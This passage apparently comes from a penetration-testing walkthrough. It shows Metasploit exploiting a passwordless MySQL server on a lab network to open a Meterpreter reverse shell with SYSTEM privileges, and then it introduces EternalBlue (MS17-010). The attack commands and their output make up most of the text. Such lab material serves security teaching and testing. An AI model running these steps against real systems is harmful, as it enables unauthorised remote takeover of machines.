```
[*] 192.168.216.10:3306 - Running MySQL Enumerator...
[*] 192.168.216.10:3306 - Enumerating Parameters
...
msf auxiliary(mysql_enum) > use exploit/windows/mysql/mysql_payload
msf exploit(mysql_payload) > set RHOST 192.168.216.10
RHOST => 192.168.216.10
msf exploit(mysql_payload) > set PAYLOAD
windows/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
msf exploit(mysql_payload) > set LHOST 192.168.216.5
LHOST => 192.168.216.5
msf exploit(mysql_payload) > exploit
```

```
[*] Started reverse TCP handler on 192.168.216.5:4444
[*] 192.168.216.10:3306 - Checking target architecture...
[*] 192.168.216.10:3306 - Checking for sys_exec()...
[*] 192.168.216.10:3306 - sys_exec() already available, using that (override with FORCE_UDF_UPLOAD).
...
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter >
```

Since the target doesn't have a root password, it is possible to use the MySQL service to upload a shell and gain remote access to the system. So, never forget to test the basics, even if you think that no one would configure a service without a password.

# MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption

Again, leveraging the intel collected during the information gathering and scanning phase, particularly the output of the MS17-010 SMB RCE Detection auxiliary module, we can move to our next vulnerable service.